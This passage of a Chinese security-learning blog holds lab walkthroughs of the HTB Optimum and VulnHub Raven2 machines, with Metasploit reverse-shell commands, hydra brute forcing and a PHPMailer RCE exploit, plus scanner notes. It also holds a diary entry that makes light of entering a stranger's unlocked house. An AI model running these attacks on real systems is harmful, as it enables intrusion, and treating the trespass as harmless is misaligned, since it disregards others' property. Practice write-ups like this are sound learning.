class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">searchsploit hfs<br>Rejetto HTTP File<span class="hljs-built_in"> Server </span>(HFS) 2.3.x - Remote Command Execution<br><br>msfconsole<br>use exploit/windows/http/rejetto_hfs_exec<br><span class="hljs-builtin-name">set</span> RHOST 10.10.10.8<br><span class="hljs-builtin-name">set</span> LHOST 10.10.14.17<br><span class="hljs-builtin-name">set</span> SRVHOST 10.10.14.17 <br><span class="hljs-builtin-name">run</span><br><br>background<br></code></pre></div></td></tr></table></figure><p><strong>sysinfo</strong></p><figure class="highlight yaml"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs yaml"><span class="hljs-attr">Computer        :</span> <span class="hljs-string">OPTIMUM</span><br><span class="hljs-attr">OS              :</span> <span class="hljs-string">Windows</span> <span class="hljs-number">2012 </span><span class="hljs-string">R2</span> <span class="hljs-string">(Build</span> <span class="hljs-number">9600</span><span class="hljs-string">).</span><br><span class="hljs-attr">Architecture    :</span> <span class="hljs-string">x64</span><br><span class="hljs-attr">System Language :</span> <span class="hljs-string">el_GR</span><br><span class="hljs-attr">Domain          :</span> <span class="hljs-string">HTB</span><br><span class="hljs-attr">Logged On Users :</span> <span class="hljs-number">2</span><br><span class="hljs-attr">Meterpreter     :</span> <span class="hljs-string">x86/windows</span><br></code></pre></div></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><figure class="highlight pgsql"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs pgsql"><span class="hljs-keyword">search</span> suggester<br>use post/multi/recon/local_exploit_suggester<br><br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.8</span> - exploit/windows/<span class="hljs-keyword">local</span>/bypassuac_eventvwr: The target appears <span class="hljs-keyword">to</span> be vulnerable.<br>[+] <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.8</span> - exploit/windows/<span class="hljs-keyword">local</span>/ms16_032_secondary_logon_handle_privesc: The target service <span class="hljs-keyword">is</span> running, but could <span class="hljs-keyword">not</span> be validated.<br><br>use exploit/windows/<span class="hljs-keyword">local</span>/bypassuac_eventvwr<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">set</span> LHOST tun0<br><span class="hljs-keyword">set</span> LHOST tun0  不知道为什么要设置两遍，才能成功设置为该网卡<br>run<br>失败，用户不是<span class="hljs-keyword">admin</span>组，不能提权<br><br>use exploit/windows/<span class="hljs-keyword">local</span>/ms16_032_secondary_logon_handle_privesc<br><span class="hljs-keyword">set</span> LHOST tun0<br><span class="hljs-keyword">set</span> LHOST <span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.17</span><br><span class="hljs-keyword">set</span> <span class="hljs-keyword">SESSION</span> <span class="hljs-number">1</span><br><span class="hljs-keyword">show</span> <span class="hljs-keyword">options</span><br>run<br>提权依然失败。<br><br>shell<br>whoami<br>optimum\kostas<br><br>net <span class="hljs-keyword">user</span><br>Administrator            Guest                    kostas<br></code></pre></div></td></tr></table></figure><h2 id="writeup"><a href="#writeup" class="headerlink" title="writeup"></a>writeup</h2><p>job.rc</p><figure class="highlight routeros"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs routeros">use exploit/windows/http/rejetto_hfs_exec<br><span class="hljs-builtin-name">set</span> RHOST 10.10.10.8<br><span class="hljs-builtin-name">set</span> payload windows/x64/meterpreter/reverse_tcp<br><span class="hljs-builtin-name">set</span> LHOST 10.10.14.17<br><span class="hljs-builtin-name">set</span> SRVHOST 10.10.14.17 <br>run<br></code></pre></div></td></tr></table></figure><p><code>msfconsle -r job.rc</code></p><p>用sysinfo命令，可以发现<code>Meterpreter     : x32/windows</code>，而目标系统是64位。</p><p><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-07/4.PNG" alt="4"><br>没有发现任何可用exp，可用来提权。<br>获得了SESSION 4</p><p>search CVE-2016-0099<br>search CVE-2017-0100</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">search</span> exploit/windows/local<br><span class="hljs-attribute">use</span> exploit/windows/local/ms<span class="hljs-number">16</span>_<span class="hljs-number">032</span>_secondary_logon_handle_privesc<br><span class="hljs-attribute">set</span> payload windows/x<span class="hljs-number">64</span>/meterpreter/reverse_tcp<br><span class="hljs-attribute">set</span> SESSION <span class="hljs-number">1</span><br><span class="hljs-attribute">set</span> LPORT <span class="hljs-number">4445</span><br><span class="hljs-attribute">set</span> LHOST <span class="hljs-number">10.10.14.17</span><br><span class="hljs-attribute">set</span> target <span class="hljs-number">1</span>        target<span class="hljs-number">0</span>代表winx<span class="hljs-number">86</span>, target<span class="hljs-number">1</span> 代表winx<span class="hljs-number">64</span><br></code></pre></div></td></tr></table></figure><p>又失败了</p><h2 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h2><p>在meterpreter上传文件的时候，会遇到这种问题：<br><code>core_channel_open: Operation failed: Access is denied</code></p><p>可能是权限不够<br>解决方法： 用lcd，getlwd切换本地目录，用cd切换到<code>C:\Users\kostas\Desktop</code></p><h2 id="再次提权"><a href="#再次提权" class="headerlink" title="再次提权"></a>再次提权</h2><p>提权工具：<a href="https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/README.md">https://github.com/GDSSecurity/Windows-Exploit-Suggester/blob/master/README.md</a><br>执行的命令：<code>python windows-exploit-suggester.py --database 2019-02-07-mssb.xls --systeminfo sys.txt</code><br> 找到可用提权的漏洞，然后msf上传exe到有执行权限的目录，即可得到最高权限。<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-07/5.PNG" alt="5"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>世界上的事情分为两种：</p><p>一种是努力过以后可以做到的；一种是无论自己怎么努力，也是做不到的。</p><p>首先要努力，才知道自己的极限。然后坦然接受结果。</p><figure class="highlight"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs">逆来顺受、随波逐流、浑浑噩噩地也是一辈子，一直卡着自己的脖子往上爬，摔下来痛苦一场，再咬牙继续往上爬，也算一辈子。<br>　　结果怎么样，谁也不能未卜先知。　　<br>　　前者觉得后者累、自讨苦吃，后者觉得前者糊里糊涂、可怜。<br>　　各有各的活法，谁也不能说谁错，可是人得挑一种对得起自己的活法——所谓对得起自己，就是甘当废柴也好，逆水行舟也好，都得坦坦荡荡。<br>　　愿意活得轻松自在的，看见别人香车宝马、功成名就，得能没有一点艳羡之心，知道自己是怎么回事，所以无论遇到什么事，也绝不会不甘心。至于那些知道自己一定会不甘心的，最好就马上洗干净脸，该干什么干什么去。<br>　　任何时候，都不会后悔，不会焦虑，不会讨厌自己，不会觉得自己浪费了生命，那就是对得起自己的活法。<br></code></pre></div></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>training</category>
      
    </categories>
    
    
    <tags>
      
      <tag>training</tag>
      
      <tag>windows</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>wapiti - python web scanner</title>
    <link href="/2019/02/05/x/"/>
    <url>/2019/02/05/x/</url>
    
    <content type="html"><![CDATA[<h2 id="下载地址："><a href="#下载地址：" class="headerlink" title="下载地址："></a>下载地址：</h2><p><code>https://sourceforge.net/projects/wapiti/</code><br>参考资料：<code>http://wapiti.sourceforge.net/</code></p><h2 id="安装："><a href="#安装：" class="headerlink" title="安装："></a>安装：</h2><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">cd /opt;<br>python3 setup.py install<br>cd <span class="hljs-regexp">/opt/</span>wapiti3-<span class="hljs-number">3.0</span>.<span class="hljs-number">1</span><br>wapiti -u http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span>/ --v <span class="hljs-number">2</span><br>python wapiti http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span>/<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">241.136</span><span class="hljs-regexp">/ldap/</span>example1.php?username=hacker&amp;password=hacker<br>安装失败<br><br>安装二：<br>apt-get install wapiti<br></code></pre></div></td></tr></table></figure><h2 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h2><p>测试一下对于ldap漏洞的fuzz，结果是并没有识别出漏洞。但是该工具对于sql注入等漏洞有着不错的识别效果。</p><p><code>/usr/bin/wapiti -u http://192.168.241.136/ldap/example1.php?username=hacker&amp;password=hacker</code><br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-05/2.PNG" alt="2"></p><h2 id="可识别漏洞类型"><a href="#可识别漏洞类型" class="headerlink" title="可识别漏洞类型"></a>可识别漏洞类型</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">backup：此模块搜索服务器上脚本的备份。<br>blindsql：基于时间的盲sql扫描程序。<br><span class="hljs-literal">crlf</span>：在HTTP头中搜索<span class="hljs-literal">CR</span> / LF注入。<br>exec：用于检测命令执行漏洞的模块。<br><span class="hljs-built_in">file</span>：搜索<span class="hljs-built_in">include</span>（）/ fread（）和其他文件处理漏洞。<br>htaccess：尝试绕过弱的htaccess配置。<br>nikto：使用Nikto数据库搜索有潜在危险的文件。<br>permanentxss：寻找永久的XSS。<br>sql：基于标准错误的SQL注入扫描程序。<br>xss：用于XSS检测的模块。<br>buster：用于文件和目录破坏程序攻击的模块 - 检查“坏”文件。<br>shellshock：用于Shellshock错误检测的模块。<br></code></pre></div></td></tr></table></figure><h2 id="工具参数："><a href="#工具参数：" class="headerlink" title="工具参数："></a>工具参数：</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs livecodeserver">optional arguments:<br>  -h, <span class="hljs-comment">--help            show this help message and exit</span><br>  -u <span class="hljs-built_in">URL</span>, <span class="hljs-comment">--url URL     The base URL used to define the scan scope (default</span><br>                        scope is <span class="hljs-built_in">folder</span>)<br>  <span class="hljs-comment">--scope &#123;page,folder,domain,url&#125;</span><br>                        Set scan scope<br>  -m MODULES_LIST, <span class="hljs-comment">--module MODULES_LIST</span><br>                        List <span class="hljs-keyword">of</span> modules <span class="hljs-built_in">to</span> <span class="hljs-built_in">load</span><br>  <span class="hljs-comment">--list-modules        List Wapiti attack modules and exit</span><br>  -l LEVEL, <span class="hljs-comment">--level LEVEL</span><br>                        Set attack level<br>  -p PROXY_URL, <span class="hljs-comment">--proxy PROXY_URL</span><br>                        Set <span class="hljs-keyword">the</span> HTTP(S) proxy <span class="hljs-built_in">to</span> use. Supported: <span class="hljs-keyword">http</span>(s) <span class="hljs-keyword">and</span><br>                        socks proxies<br>  -<span class="hljs-keyword">a</span> CREDENTIALS, <span class="hljs-comment">--auth-cred CREDENTIALS</span><br>                        Set HTTP authentication credentials<br>  <span class="hljs-comment">--auth-type &#123;basic,digest,kerberos,ntlm&#125;</span><br>                        Set <span class="hljs-keyword">the</span> authentication type <span class="hljs-built_in">to</span> use<br>  -c COOKIE_FILE, <span class="hljs-comment">--cookie COOKIE_FILE</span><br>                        Set <span class="hljs-keyword">a</span> JSON cookie <span class="hljs-built_in">file</span> <span class="hljs-built_in">to</span> use<br>  <span class="hljs-comment">--skip-crawl          Don&#x27;t resume the scanning process, attack URLs scanned</span><br>                        during <span class="hljs-keyword">a</span> previous session<br>  <span class="hljs-comment">--resume-crawl        Resume the scanning process (if stopped) even if some</span><br>                        attacks were previously performed<br>  <span class="hljs-comment">--flush-attacks       Flush attack history and vulnerabilities for the</span><br>                        current session<br>  <span class="hljs-comment">--flush-session       Flush everything that was previously found for this</span><br>                        target (crawled URLs, vulns, etc)<br>  -s <span class="hljs-built_in">URL</span>, <span class="hljs-comment">--start URL   Adds an url to start scan with</span><br>  -x <span class="hljs-built_in">URL</span>, <span class="hljs-comment">--exclude URL</span><br>                        Adds <span class="hljs-keyword">an</span> url <span class="hljs-built_in">to</span> exclude <span class="hljs-built_in">from</span> <span class="hljs-keyword">the</span> scan<br>  -r PARAMETER, <span class="hljs-comment">--remove PARAMETER</span><br>                        Remove this parameter <span class="hljs-built_in">from</span> urls<br>  <span class="hljs-comment">--skip PARAMETER      Skip attacking given parameter(s)</span><br>  -d DEPTH, <span class="hljs-comment">--depth DEPTH</span><br>                        Set how deep <span class="hljs-keyword">the</span> scanner should explore <span class="hljs-keyword">the</span> website<br>  <span class="hljs-comment">--max-links-per-page MAX</span><br>                        Set how many (<span class="hljs-keyword">in</span>-scope) links <span class="hljs-keyword">the</span> scanner should<br>                        extract <span class="hljs-keyword">for</span> <span class="hljs-keyword">each</span> page<br>  <span class="hljs-comment">--max-files-per-dir MAX</span><br>                        Set how many pages <span class="hljs-keyword">the</span> scanner should explore per<br>                        <span class="hljs-built_in">directory</span><br>  <span class="hljs-comment">--max-scan-time MINUTES</span><br>                        Set how many minutes you want <span class="hljs-keyword">the</span> scan <span class="hljs-built_in">to</span> <span class="hljs-keyword">last</span> (floats<br>                        accepted)<br>  <span class="hljs-comment">--max-parameters MAX  URLs and forms having more than MAX input parameters</span><br>                        will be erased <span class="hljs-keyword">before</span> attack.<br>  -S FORCE, <span class="hljs-comment">--scan-force FORCE</span><br>                        Easy way <span class="hljs-built_in">to</span> reduce <span class="hljs-keyword">the</span> <span class="hljs-built_in">number</span> <span class="hljs-keyword">of</span> scanned <span class="hljs-keyword">and</span> attacked<br>                        URLs. Possible values: paranoid, sneaky, polite,<br>                        <span class="hljs-keyword">normal</span>, aggressive, insane<br>  -t SECONDS, <span class="hljs-comment">--timeout SECONDS</span><br>                        Set timeout <span class="hljs-keyword">for</span> requests<br>  -H HEADER, <span class="hljs-comment">--header HEADER</span><br>                        Set <span class="hljs-keyword">a</span> custom header <span class="hljs-built_in">to</span> use <span class="hljs-keyword">for</span> every requests<br>  -A AGENT, <span class="hljs-comment">--user-agent AGENT</span><br>                        Set <span class="hljs-keyword">a</span> custom user-agent <span class="hljs-built_in">to</span> use <span class="hljs-keyword">for</span> every requests<br>  <span class="hljs-comment">--verify-ssl &#123;0,1&#125;    Set SSL check (default is no check)</span><br>  <span class="hljs-comment">--color               Colorize output</span><br>  -v LEVEL, <span class="hljs-comment">--verbose LEVEL</span><br>                        Set verbosity level (<span class="hljs-number">0</span>: quiet, <span class="hljs-number">1</span>: <span class="hljs-keyword">normal</span>, <span class="hljs-number">2</span>: verbose)<br>  -f FORMAT, <span class="hljs-comment">--format FORMAT</span><br>                        Set output <span class="hljs-built_in">format</span>. Supported: json, html (default),<br>                        txt, openvas, vulneranet, xml<br>  -o OUPUT_PATH, <span class="hljs-comment">--output OUPUT_PATH</span><br>                        Output <span class="hljs-built_in">file</span> <span class="hljs-keyword">or</span> <span class="hljs-built_in">folder</span><br>  <span class="hljs-comment">--no-bugreport        Don&#x27;t send automatic bug report when an attack module</span><br>                        fails<br>  <span class="hljs-comment">--version             Show program&#x27;s version number and exit</span><br></code></pre></div></td></tr></table></figure><p>-n：使用相同的模式定义要读取的URL限制（防止无限循环），此处限制为10。<br>-b：设置扫描范围，这里我们分析与传递的URL在同一域中的所有页面的链接。<br>-u：使用颜色突出显示输出中的漏洞参数。<br>-v：定义详细级别，这里我们打印每个URL。<br>-f：定义报告类型，这里我们选择HTML格式。<br>-o：定义报告目标，在我们的例子中它必须是一个目录，因为我们选择HTML格式。</p>]]></content>
    
    
    <categories>
      
      <category>scan</category>
      
    </categories>
    
    
  </entry>
  
  
  
  <entry>
    <title>除夕纪事</title>
    <link href="/2019/02/04/x/"/>
    <url>/2019/02/04/x/</url>
    
    <content type="html"><![CDATA[<p>坐过飞机，搭上巴士，再转小汽车，跨越上千公里，我又回到了山中外婆家。如果是在宫崎骏的动画里，远离城市的乡村应该画的很美吧。可惜不是，外婆住的地方靠近一个<br>大坝，除了一条河一条公路，什么也没有。。</p><p>一开始十分不适应，烧炭取暖，如厕不便都让我十分不耐烦。</p><p>我老是心心念念地学渗透，开着移动数据，网速十分差劲，让我十分不爽(* ￣︿￣)</p><p>今晚是除夕夜，我和妹妹沿着沅江散步，天渐渐黑了起来。山中房屋稀疏的坐落在山路两旁，一边是山，<br>一边是水。</p><p>于是我和她散着步，越走越远。</p><p>拐过一个弯，有一个铁栅栏围着的二层楼房，在这片全是木制房屋的乡村里，显得十分突兀。</p><p>我们走近了看，发现铁门后，还有摄像头，一切的一切都让我十分好奇。这让我想起了日本动漫里面</p><p>有钱人的住宅，或者是美国电影里位于隐蔽地理位置的邪恶实验室。</p><p>我兴奋的一指红光，对妹妹说，“看，摄像头”，俺妹心情也很激动，就像一场探险的游戏。</p><p>怀着暗搓搓的隐秘心情，我伸出手，把铁门门栓拉开了，意外的是，没有反锁。</p><p>我妹妹说她害怕，我安慰她了一下，然后往有着微光的窗户走去。</p><p>因为身高不够，我用臂力把住防盗窗，跳起来草草的往里面看了一眼。奇怪的是，里面是摄像头的监控画面，空无一人。</p><p>我抱着妹妹的大腿，让她也往里面看了一会儿。</p><p>绕过窗户，走了一段，我们看到了防盗门，房子整体看起来很新，不差钱的样子。右侧有指纹解锁的仪表盘。</p><p>我又伸出手，把门把手向下压，然后一拉，门又开了。我和妹妹对视一眼，我说明天再来看看吧，实在是有点恐怖了。</p><p>em…住在这里的村民，无不挂着灯笼，门前贴着对联，门口留着鞭炮放下的残渣。<br>而这里，太缺少人气了。</p><p>因为天色已晚，我们战略性撤退了。</p><p>回到家中，回顾刚才发生的一切。</p><p>事实上，我并没有太多擅闯民宅的意识，主要是这个房子太古怪了，如果就这样放弃探索，实在是可惜。而且这是中国，民众没有枪支，而且就算擅闯民宅被抓住，法律也不允许房主直接击毙闯入者（==）</p><p>ps: 偶然抬头，我才发现山中的星星太美了，而地球在远方看起来，就像这天上中的某一颗一样吗？也许因为地球不发光，所以看不到。</p><p>仰望到脖子都要断掉，我摆了摆头，就好像远古恐龙摆了摆尾巴，烦恼一扫而空地回到了屋中。</p>]]></content>
    
    
    <categories>
      
      <category>View</category>
      
    </categories>
    
    
    <tags>
      
      <tag>View</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>raven2（CVE-2016-10033）</title>
    <link href="/2019/02/01/x/"/>
    <url>/2019/02/01/x/</url>
    
    <content type="html"><![CDATA[<figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">22</span>/tcp  open  ssh     OpenSSH <span class="hljs-number">6</span>.<span class="hljs-number">7</span>p<span class="hljs-number">1</span> Debian <span class="hljs-number">5</span>+deb<span class="hljs-number">8</span>u<span class="hljs-number">4</span> (protocol <span class="hljs-number">2</span>.<span class="hljs-number">0</span>)<br><span class="hljs-attribute">80</span>/tcp  open  http    Apache httpd <span class="hljs-number">2</span>.<span class="hljs-number">4</span>.<span class="hljs-number">10</span> ((Debian))<br><span class="hljs-attribute">111</span>/tcp open  rpcbind <span class="hljs-number">2</span>-<span class="hljs-number">4</span> (RPC #<span class="hljs-number">100000</span>)<br></code></pre></div></td></tr></table></figure><h2 id="try1-ssh用户枚举"><a href="#try1-ssh用户枚举" class="headerlink" title="try1-ssh用户枚举"></a>try1-ssh用户枚举</h2><figure class="highlight gradle"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs gradle">python ssh.py --userList <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/wordlists/</span>linux-user.txt --outputFile out.txt <span class="hljs-number">192.168</span>.<span class="hljs-number">2.133</span><br>cat out.txt | <span class="hljs-keyword">grep</span> -v <span class="hljs-string">&#x27;not&#x27;</span> &gt; name.txt<br>awk <span class="hljs-string">&#x27;&#123;print $1&#125;&#x27;</span> name.txt &gt; user.txt<br></code></pre></div></td></tr></table></figure><p>获得的用户：</p><figure class="highlight lasso"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs lasso">michael<br>steven<br><span class="hljs-params">...</span><span class="hljs-params">...</span><br></code></pre></div></td></tr></table></figure><p><code>hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -I 192.168.2.133 ssh</code></p><p>我猜弱口令应该已经修补了。但是还是得试一试，==，万一又有，我又没发现这么低级的漏洞，岂不是很没有面子。</p><h2 id="try2-web-enum"><a href="#try2-web-enum" class="headerlink" title="try2-web enum"></a>try2-web enum</h2><p>方法：<br><code>wpscan --url &quot;http://192.168.2.133/wordpress/&quot; --wp-content-dir &quot;/wordpress&quot; --enumerate u --enumerate p</code></p><p>信息：</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">WordPress <span class="hljs-number">4.8</span>.<span class="hljs-number">7</span><br>Apache/<span class="hljs-number">2.4</span>.<span class="hljs-number">10</span> (Debian)<br><br>后台：http:<span class="hljs-regexp">//</span>raven.local<span class="hljs-regexp">/wordpress/</span>wp-login.php<br><br><span class="hljs-number">192.168</span>.<span class="hljs-number">2.133</span><span class="hljs-regexp">/vendor/</span>changelog.md<br>PHPMailer <span class="hljs-number">6.0</span><br>Version <span class="hljs-number">5.2</span>.<span class="hljs-number">17</span> (December <span class="hljs-number">9</span>th <span class="hljs-number">2016</span>)<br></code></pre></div></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">searchsploit</span> PHPMailer<br><br><span class="hljs-attribute">PHPMailer</span> &lt; <span class="hljs-number">5</span>.<span class="hljs-number">2</span>.<span class="hljs-number">20</span> with Exim MTA - Remote Code Execution                                                    | exploits/php/webapps/<span class="hljs-number">42221</span>.py<br></code></pre></div></td></tr></table></figure><p>searchsploit -m exploits/php/webapps/42221.py</p><figure class="highlight awk"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs awk">  Exploit: PHPMailer &lt; <span class="hljs-number">5.2</span>.<span class="hljs-number">20</span> with Exim MTA - Remote Code Execution<br>      URL: https:<span class="hljs-regexp">//</span>www.exploit-db.com<span class="hljs-regexp">/exploits/</span><span class="hljs-number">42221</span>/<br>     Path: <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/exploitdb/</span>exploits<span class="hljs-regexp">/php/</span>webapps/<span class="hljs-number">42221</span>.py<br>File Type: Python script, ASCII text executable, with CRLF line terminators<br><br>Copied to: <span class="hljs-regexp">/root/</span><span class="hljs-number">42221</span>.py<br></code></pre></div></td></tr></table></figure><p>see /root/42221.py<br>mv /root/42221.py rce_phpmailer_exim4.py<br>python rce_phpmailer_exim4.py -url <a href="http://192.168.2.133/">http://192.168.2.133/</a> -cf contact.php -ip 192.168.2.133<br><img src="https://raw.githubusercontent.com/Whale3070/Whale3070.github.io/master/img/02-01/1.PNG" alt="1"></p><hr><p>时隔2个月，继续这个靶机的练习<br>192.168.241.128</p><p>command:</p><figure class="highlight jboss-cli"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs jboss-cli"><span class="hljs-keyword">echo</span> 192.168.241.128 raven.local &gt;&gt; <span class="hljs-string">/etc/hosts</span><br>wpscan <span class="hljs-params">--url</span> <span class="hljs-string">&quot;http://192.168.241.128/wordpress/&quot;</span> <span class="hljs-params">--wp-content-dir</span> <span class="hljs-string">&quot;/wordpress&quot;</span> <span class="hljs-params">--enumerate</span><br><br></code></pre></div></td></tr></table></figure><h2 id="存在的目录："><a href="#存在的目录：" class="headerlink" title="存在的目录："></a>存在的目录：</h2><p><a href="http://raven.local/vendor/changelog.md">http://raven.local/vendor/changelog.md</a><br><a href="http://raven.local/manual/en/index.html">http://raven.local/manual/en/index.html</a> apache的目录</p><hr><p>wordpress 4.8.7漏洞资料<br><a href="https://www.cvedetails.com/vulnerability-list/vendor_id-2337/product_id-4096/version_id-224338/Wordpress-Wordpress-4.8.html">https://www.cvedetails.com/vulnerability-list/vendor_id-2337/product_id-4096/version_id-224338/Wordpress-Wordpress-4.8.html</a></p><p>CVE-2018-20148：PHP Object Injection via Meta Data</p><hr><h2 id="info"><a href="#info" class="headerlink" title="info:"></a>info:</h2><p><a href="http://192.168.241.128/wordpress/?attachment_id=11">http://192.168.241.128/wordpress/?attachment_id=11</a><br>wpscan扫描了这个目录，获得flag3</p><p><a href="http://raven.local/vendor/PATH">http://raven.local/vendor/PATH</a><br>发现目录遍历，获得flag1</p><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>无弱密码；有0day漏洞，但没有exp；无脆弱的wordpress插件</p><p>查看wp后，就是自己没有发现目录遍历漏洞=。=</p><p><a 